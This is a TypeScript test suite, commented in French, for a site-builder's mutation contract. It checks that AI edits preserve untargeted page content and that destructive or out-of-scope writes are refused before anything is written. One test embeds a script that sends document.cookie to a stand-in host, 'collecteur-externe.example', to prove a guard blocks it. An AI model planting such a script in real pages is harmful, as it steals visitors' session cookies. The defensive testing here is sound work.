/**
 * LOT A (É53) — MUTATION CONTRACT & USER WORK PRESERVATION.
 *
 * Cause racine TC1 (audit transversal) : un UPDATE_FILE document entier sans
 * invariant permettait de détruire le travail existant. Ces tests prouvent :
 *   - le contrat protège tout élément identifiable non ciblé (sections,
 *     formulaire, tarifs, témoignages, titre, boutons, images, polices, nav) ;
 *   - les suppressions explicitement autorisées restent possibles ;
 *   - le refus précède TOUTE écriture (aucun rollback requis, contenu intact) ;
 *   - les invariants du contrat sont réellement évalués (verification.ts) ;
 *   - la compatibilité É51 (guardAiWrite) et le rollback transactionnel.
 */

import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import {
  FileStore,
  FileStoreAdapter,
  InMemoryMutableFileSource,
  MutationOrchestratorService,
  MutationContractViolationError,
  MutationInvariantError,
  buildMutationContract,
  extractDocumentInventory,
  verifyMutationContract,
  describeContractViolations,
  verifyPostMutationState,
  type MutationContract,
  type SingleMutation
} from '../../../src/index.js';

// ---------------------------------------------------------------------------
// Document d'essai : sections, formulaire, tarifs, témoignages, navigation,
// polices, image — le scénario de la mission (Studio).
// ---------------------------------------------------------------------------
const BASE_HTML = `<!DOCTYPE html>
<html lang="fr">
<head><meta charset="utf-8"><title>Studio Lumière</title>
<style>body { font-family: 'Inter', sans-serif; }</style></head>
<body>
<nav><a href="#accueil">Accueil</a><a href="#tarifs">Tarifs</a></nav>
<div data-section="hero"><h1>Studio Lumière</h1><p>Photographe à Lyon.</p><button>Réserver</button></div>
<div data-section="pricing"><h2>Nos tarifs</h2><p>Formules dès 290 euros.</p></div>
<div data-section="testimonials"><h2>Témoignages</h2><p>Superbe travail, merci !</p></div>
<div data-section="about"><h2>À propos</h2><p>Passionné depuis 2010.</p></div>
<form action="/contact"><input name="email" type="email"><button>Envoyer</button></form>
<img src="images/studio.jpg" alt="Studio">
</body>
</html>`;

function withHeroTitle(html: string, newTitle: string): string {
  return html.replace('<h1>Studio Lumière</h1>', `<h1>${newTitle}</h1>`);
}

function withoutSection(html: string, sectionId: string): string {
  const re = new RegExp(`<div data-section="${sectionId}">[\\s\\S]*?</div>\\n?`, 'g');
  return html.replace(re, '');
}

function withoutForm(html: string): string {
  return html.replace(/<form[\s\S]*?<\/form>\n?/, '');
}

function buildUpdateContract(beforeHtml: string, message: string, intentCategory?: string): MutationContract {
  return buildMutationContract({
    beforeHtml,
    userMessage: message,
    intentCategory,
    targetFiles: ['index.html'],
    mode: 'update'
  });
}

function updateMutation(content: string): SingleMutation {
  return {
    mutationId: 'm-update',
    kind: 'UPDATE_FILE',
    target: 'index.html',
    preconditions: [{ kind: 'FILE_EXISTS', target: 'index.html', description: 'fichier existant' }],
    operation: { path: 'index.html', content },
    expectedOutcome: 'mise à jour index.html',
    evidence: []
  };
}

// ===========================================================================
describe('LOT A — inventaire du document (extractDocumentInventory)', () => {
  it('identifie sections, titre, titres internes, formulaire, image, boutons, nav, police', () => {
    const inv = extractDocumentInventory(BASE_HTML);
    assert.deepEqual(inv.sections.map((s) => s.id), ['hero', 'pricing', 'testimonials', 'about']);
    assert.equal(inv.title, 'Studio Lumière');
    assert.equal(inv.forms, 1);
    assert.deepEqual(inv.images.map((i) => i.fingerprint), ['studio.jpg']);
    assert.equal(inv.navPresent, true);
    assert.deepEqual(inv.fonts, ['inter']);
    const buttonHero = inv.buttons.find((b) => b.ownerSectionId === 'hero');
    assert.equal(buttonHero?.text, 'Réserver');
    const headingHero = inv.headings.find((h) => h.ownerSectionId === 'hero');
    assert.equal(headingHero?.text, 'Studio Lumière');
    assert.ok(inv.identifiableCount >= 10);
  });

  it('document sans aucun élément identifiable : identifiableCount = 0', () => {
    const inv = extractDocumentInventory('<!DOCTYPE html><html><body>Texte seul sans structure.</body></html>');
    assert.equal(inv.identifiableCount, 0);
  });
});

// ===========================================================================
describe('LOT A — construction du contrat (buildMutationContract)', () => {
  it('création : contrat explicite avec protection vide', () => {
    const contract = buildMutationContract({
      beforeHtml: '',
      userMessage: 'Crée un site',
      targetFiles: ['index.html'],
      mode: 'create'
    });
    assert.equal(contract.operationScope.kind, 'creation');
    assert.deepEqual(contract.protectedContent, []);
    assert.deepEqual(contract.requiredInvariants, []);
  });

  it('modification ciblée du titre : titre/h1 modifiables, le reste protégé', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal en « Studio Photo Lyon »');
    assert.equal(contract.operationScope.kind, 'targeted-modification');
    const ids = contract.protectedContent.map((p) => p.elementId);
    assert.ok(!ids.includes('title'), 'le <title> ciblé n’est pas protégé');
    assert.ok(!ids.some((id) => id.startsWith('heading:')), 'les h1/h2 ciblés ne sont pas protégés');
    assert.ok(ids.includes('section:hero'), 'section hero protégée (présence)');
    assert.ok(ids.includes('section:pricing'), 'tarifs protégés');
    assert.ok(ids.includes('section:testimonials'), 'témoignages protégés');
    assert.ok(ids.includes('form'), 'formulaire protégé');
    assert.ok(ids.includes('image:studio.jpg'), 'image protégée');
    assert.ok(ids.includes('font:inter'), 'police protégée');
    assert.ok(ids.includes('nav'), 'navigation protégée');
    assert.ok(ids.includes('button:envoyer'), 'bouton non ciblé protégé');
    // Invariant de préservation réellement déclaré et borné.
    assert.equal(contract.requiredInvariants.length, 1);
    assert.equal(contract.requiredInvariants[0]?.kind, 'CONTENT_PRESERVED');
    const fingerprints = JSON.parse(contract.requiredInvariants[0]?.expectedValue ?? '[]') as Array<{ fingerprint: string }>;
    assert.ok(fingerprints.some((f) => f.fingerprint === 'data-section="pricing"'));
  });

  it('modification d’un bouton précis : ce bouton modifiable, les autres protégés', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le bouton Réserver en « Prendre rendez-vous »');
    const ids = contract.protectedContent.map((p) => p.elementId);
    assert.ok(!ids.includes('button:reserver'), 'le bouton ciblé n’est pas protégé');
    assert.ok(ids.includes('button:envoyer'), 'l’autre bouton reste protégé');
    // Le token du bouton ciblé est exempté de la couverture de la section hero.
    assert.ok((contract.coverageExemptions?.hero ?? []).includes('reserver'));
  });

  it('suppression explicitement demandée : élément autorisé, retiré des protégés', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Supprime le formulaire de contact');
    assert.deepEqual(contract.allowedDeletions.map((d) => d.elementId), ['form']);
    assert.ok(!contract.protectedContent.some((p) => p.elementId === 'form'));
    assert.equal(contract.operationScope.kind, 'deletion');
  });

  it('suppression sans cible identifiable : RIEN n’est autorisé (fail-closed)', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Supprime un peu de contenu');
    assert.deepEqual(contract.allowedDeletions, []);
    assert.ok(contract.protectedContent.length > 0);
  });

  it('reconstruction complète explicitement demandée : autorisée et tracée', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Reconstruis tout le site à partir de zéro');
    assert.equal(contract.operationScope.kind, 'full-rebuild');
    assert.equal(contract.operationScope.rebuildExplicitlyRequested, true);
    assert.deepEqual(contract.protectedContent, []);
    assert.ok(contract.operationScope.requestDigest.includes('Reconstruis'));
  });

  it('demande vague (« refais » sans totalité) : PAS de reconstruction, tout protégé', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Refais le formulaire plus moderne');
    assert.notEqual(contract.operationScope.kind, 'full-rebuild');
    assert.ok(contract.protectedContent.length > 0);
  });

  // =========================================================================
  // LOT A-C1 (validation corrective) — la formulation « remplace … par … »
  // était refusée (PROTECTED_CONTENT_LOST) car « remplace » n'était pas un
  // verbe de reconstruction et la description du NOUVEAU contenu comptait
  // comme cible. Ces tests prouvent le correctif ET les garde-fous.
  // =========================================================================

  it('C1.1 — remplacement total explicite (« …par juste un grand titre ») : ACCEPTÉ comme full-rebuild', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Remplace tout le contenu de la page par juste un grand titre Bienvenue');
    assert.equal(contract.operationScope.kind, 'full-rebuild', 'la reconstruction totale explicite est reconnue');
    assert.equal(contract.operationScope.rebuildExplicitlyRequested, true);
    assert.deepEqual(contract.protectedContent, [], 'aucun protégé : tout est remplaçable, autorisation tracée');
    assert.ok(contract.operationScope.requestDigest.includes('Remplace'));
  });

  it('C1.2 — remplacement ciblé : PAS de reconstruction, les autres éléments protégés', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Remplace le bouton Réserver par « Prendre rendez-vous »');
    assert.notEqual(contract.operationScope.kind, 'full-rebuild', 'un ciblage précis prime sur le verbe de remplacement');
    const ids = contract.protectedContent.map((p) => p.elementId);
    assert.ok(!ids.includes('button:reserver'), 'le bouton ciblé reste modifiable');
    assert.ok(ids.includes('button:envoyer'), 'l’autre bouton reste protégé');
    assert.ok(ids.includes('section:pricing'), 'tarifs protégés');
    assert.ok(ids.includes('section:testimonials'), 'témoignages protégés');
  });

  it('C1.3 — « toutes » n’est pas une totalité : modification ciblée, pas de reconstruction', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Remplace toutes les images par des photos d’oiseaux');
    assert.notEqual(contract.operationScope.kind, 'full-rebuild');
    const ids = contract.protectedContent.map((p) => p.elementId);
    assert.ok(!ids.includes('image:studio.jpg'), 'image ciblée modifiable');
    assert.ok(ids.includes('section:pricing'), 'sections protégées');
    assert.ok(ids.includes('form'), 'formulaire protégé');
  });

  it('C1.4 — « supprime tout » sans verbe de remplacement : PAS un rebuild, rien d’autorisé (fail-closed)', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Supprime tout le contenu de la page');
    assert.notEqual(contract.operationScope.kind, 'full-rebuild', 'un verbe de suppression n’est jamais une reconstruction');
    assert.deepEqual(contract.allowedDeletions, [], 'aucune cible identifiable → rien d’autorisé');
    assert.ok(contract.protectedContent.length > 0);
  });

  it('C1.5 — cible nommée AVANT le marqueur : reste une modification ciblée', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Remplace tout le contenu de la section hero par une grille plus lisible');
    assert.notEqual(contract.operationScope.kind, 'full-rebuild', 'la section nommée avant « par » est une cible, pas une description du nouveau contenu');
    const ids = contract.protectedContent.map((p) => p.elementId);
    assert.ok(!ids.includes('section:hero'), 'hero ciblé : modifiable');
    assert.ok(ids.includes('section:pricing'), 'tarifs protégés');
    assert.ok(ids.includes('section:testimonials'), 'témoignages protégés');
  });
});

// ===========================================================================
describe('LOT A — vérification de préservation (verifyMutationContract)', () => {
  const contractTargeted = buildUpdateContract(BASE_HTML, 'Change le titre principal en « Studio Photo Lyon »');

  it('1. modification de l’élément autorisé : ACCEPTÉE', () => {
    const check = verifyMutationContract(contractTargeted, BASE_HTML, withHeroTitle(BASE_HTML, 'Studio Photo Lyon'));
    assert.equal(check.allowed, true, describeContractViolations(check.violations));
  });

  it('2. modification d’un bouton : formulaire, tarifs et témoignages préservés', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le bouton Réserver en « Prendre rendez-vous »');
    const after = BASE_HTML.replace('<button>Réserver</button>', '<button>Prendre rendez-vous</button>');
    const check = verifyMutationContract(contract, BASE_HTML, after);
    assert.equal(check.allowed, true, describeContractViolations(check.violations));
    const verdicts = Object.fromEntries(check.checks.map((c) => [c.elementId, c.verdict]));
    assert.equal(verdicts['form'], 'preserved');
    assert.equal(verdicts['section:pricing'], 'preserved');
    assert.equal(verdicts['section:testimonials'], 'preserved');
  });

  it('3. suppression d’un élément protégé : REFUSÉE (section tarifs qui disparaît)', () => {
    const check = verifyMutationContract(contractTargeted, BASE_HTML, withoutSection(BASE_HTML, 'pricing'));
    assert.equal(check.allowed, false);
    assert.ok(check.violations.some((v) => v.code === 'PROTECTED_CONTENT_LOST' && v.elementId === 'section:pricing'));
  });

  it('4. suppression explicitement autorisée : ACCEPTÉE', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Supprime le formulaire de contact');
    const check = verifyMutationContract(contract, BASE_HTML, withoutForm(BASE_HTML));
    assert.equal(check.allowed, true, describeContractViolations(check.violations));
  });

  it('3bis. dégradation lourde d’une section protégée non ciblée : REFUSÉE', () => {
    const rewritten = BASE_HTML.replace(
      '<div data-section="testimonials"><h2>Témoignages</h2><p>Superbe travail, merci !</p></div>',
      '<div data-section="testimonials"><h2>Nouvelle vie</h2><p>Contenu entièrement différent ici.</p></div>'
    );
    const check = verifyMutationContract(contractTargeted, BASE_HTML, rewritten);
    assert.equal(check.allowed, false);
    assert.ok(check.violations.some((v) => v.elementId === 'section:testimonials'));
  });

  it('5. révision de référence incohérente : REFUSÉE (contrat périmé)', () => {
    const check = verifyMutationContract(contractTargeted, BASE_HTML.replace('Photographe', 'Photographe senior'), withHeroTitle(BASE_HTML, 'Studio Photo Lyon'));
    assert.equal(check.allowed, false);
    assert.ok(check.violations.some((v) => v.code === 'SOURCE_REVISION_MISMATCH'));
  });

  it('fail-closed : document sans élément identifiable + perte massive → REFUSÉE', () => {
    const unmarked = '<!DOCTYPE html><html><body>' + '<p>Texte sans structure identifiable. '.repeat(30) + '</p></body></html>';
    const contract = buildUpdateContract(unmarked, 'Améliore la page');
    const destroyed = '<!DOCTYPE html><html><body><p>Nouvelle page.</p></body></html>';
    const check = verifyMutationContract(contract, unmarked, destroyed);
    assert.equal(check.allowed, false);
    assert.ok(check.violations.some((v) => v.code === 'PRESERVATION_UNVERIFIABLE'));
  });

  it('reconstruction explicite : AUCUN contrôle de préservation (autorisée)', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Reconstruis tout le site à partir de zéro');
    const check = verifyMutationContract(contract, BASE_HTML, '<!DOCTYPE html><html><body><p>Nouveau site.</p></body></html>');
    assert.equal(check.allowed, true);
  });

  it('contrat absent ou illisible : REFUS prudent', () => {
    const check = verifyMutationContract(undefined, BASE_HTML, BASE_HTML);
    assert.equal(check.allowed, false);
    assert.ok(check.violations.some((v) => v.code === 'MALFORMED_CONTRACT'));
  });
});

// ===========================================================================
describe('LOT A — application centrale par le Mutation Orchestrator', () => {
  let fileSource: InMemoryMutableFileSource;
  let orchestrator: MutationOrchestratorService;

  beforeEach(() => {
    fileSource = new InMemoryMutableFileSource({ 'tenant-a:proj-a': { 'index.html': BASE_HTML } });
    orchestrator = new MutationOrchestratorService(fileSource);
  });

  it('5. mutation hors périmètre (autre fichier) : REFUSÉE avant écriture', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const plan = orchestrator.createPlan({
      tenantId: 'tenant-a',
      projectId: 'proj-a',
      baseGraphHash: '',
      mutations: [{ ...updateMutation(BASE_HTML), operation: { path: 'styles.css', content: 'body{}' }, target: 'styles.css', kind: 'UPDATE_FILE' }]
    });
    assert.throws(
      () => orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract }),
      (err: unknown) => err instanceof MutationContractViolationError && /hors périmètre/.test(err.message)
    );
    assert.equal(fileSource.getFile('tenant-a', 'proj-a', 'index.html')?.content, BASE_HTML, 'index.html intact');
  });

  it('3+8. mutation destructive : REFUSÉE avant écriture, AUCUNE perte du contenu initial', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const destructive = withoutSection(withHeroTitle(BASE_HTML, 'Studio Photo Lyon'), 'testimonials');
    const plan = orchestrator.createPlan({
      tenantId: 'tenant-a',
      projectId: 'proj-a',
      baseGraphHash: '',
      mutations: [updateMutation(destructive)]
    });
    assert.throws(
      () => orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract }),
      MutationContractViolationError
    );
    assert.equal(fileSource.getFile('tenant-a', 'proj-a', 'index.html')?.content, BASE_HTML, 'contenu initial préservé au caractère près');
  });

  it('7. contrat périmé (fichier modifié entre-temps) : REFUSÉE', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    // Le fichier change APRÈS la construction du contrat.
    fileSource.updateFile('tenant-a', 'proj-a', 'index.html', BASE_HTML.replace('2010', '2015'));
    const plan = orchestrator.createPlan({
      tenantId: 'tenant-a',
      projectId: 'proj-a',
      baseGraphHash: '',
      mutations: [updateMutation(withHeroTitle(BASE_HTML, 'Studio Photo Lyon'))]
    });
    assert.throws(
      () => orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract }),
      (err: unknown) => err instanceof MutationContractViolationError && /périmé/.test(err.message)
    );
  });

  it('1+9. mutation légitime avec contrat : ACCEPTÉE et persistée (non-régression)', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const plan = orchestrator.createPlan({
      tenantId: 'tenant-a',
      projectId: 'proj-a',
      baseGraphHash: '',
      mutations: [updateMutation(withHeroTitle(BASE_HTML, 'Studio Photo Lyon'))]
    });
    const result = orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract });
    assert.equal(result.success, true);
    assert.equal(
      fileSource.getFile('tenant-a', 'proj-a', 'index.html')?.content,
      withHeroTitle(BASE_HTML, 'Studio Photo Lyon'),
      'le contenu ciblé est réellement persisté'
    );
  });

  it('6. invariant CONTENT_PRESERVED réellement évalué : violation → MutationInvariantError', () => {
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const invariant = contract.requiredInvariants[0];
    assert.ok(invariant, 'le contrat déclare un invariant de préservation');
    const stripped = '<!DOCTYPE html><html><body><p>vide</p></body></html>';
    fileSource.updateFile('tenant-a', 'proj-a', 'index.html', stripped);
    assert.throws(
      () => verifyPostMutationState('tenant-a', 'proj-a', { mutationId: 'x' } as never, fileSource, undefined, undefined, { invariants: [invariant] }),
      (err: unknown) => err instanceof MutationInvariantError && /CONTENT_PRESERVED/.test(err.message)
    );
  });
});

// ===========================================================================
describe('LOT A — compatibilité É51 (guardAiWrite) et rollback transactionnel', () => {
  it('10a. contenu légitime pour le contrat mais exfiltration pour É51 : REFUSÉE par le guard', () => {
    const store = new FileStore();
    const tenantId = 'tenant-lot-a-e51';
    const projectId = 'proj-lot-a-e51';
    const fileSource = new FileStoreAdapter(store);
    const orchestrator = new MutationOrchestratorService(fileSource);
    const contentBefore = store.getFile(tenantId, projectId, 'index.html')?.content ?? null;
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const poisoned = withHeroTitle(BASE_HTML, 'Studio Photo Lyon').replace(
      '</body>',
      `<script>fetch('https://collecteur-externe.example/piste?cookie=' + encodeURIComponent(document.cookie))</script></body>`
    );
    const plan = orchestrator.createPlan({
      tenantId,
      projectId,
      baseGraphHash: '',
      mutations: [updateMutation(poisoned)]
    });
    assert.throws(
      () => orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract }),
      Error
    );
    const contentAfter = store.getFile(tenantId, projectId, 'index.html')?.content ?? null;
    assert.equal(contentAfter, contentBefore, 'aucune écriture exfiltrante (É51 intacte)');
  });

  it('10b. rollback transactionnel après mutation légitime avec contrat', () => {
    const store = new FileStore();
    const tenantId = 'tenant-lot-a-rb';
    const projectId = 'proj-lot-a-rb';
    const fileSource = new FileStoreAdapter(store);
    // Le FileStore initialise index.html par défaut : on le remplace.
    store.deleteNode(tenantId, projectId, 'index.html');
    store.createNode(tenantId, projectId, 'index.html', 'file', BASE_HTML);
    const orchestrator = new MutationOrchestratorService(fileSource);
    const contract = buildUpdateContract(BASE_HTML, 'Change le titre principal');
    const plan = orchestrator.createPlan({
      tenantId,
      projectId,
      baseGraphHash: '',
      mutations: [updateMutation(withHeroTitle(BASE_HTML, 'Studio Photo Lyon'))]
    });
    const result = orchestrator.executePlan(plan, { skipImpactCheck: true, allowHighRisk: true, allowBreaking: true, contract });
    assert.equal(result.success, true);
    const rb = orchestrator.rollback(result.transaction.transactionId, 'ENGINEER');
    assert.equal(rb.success, true);
    assert.equal(store.getFile(tenantId, projectId, 'index.html')?.content, BASE_HTML, 'rollback restaure le contenu initial');
  });
});
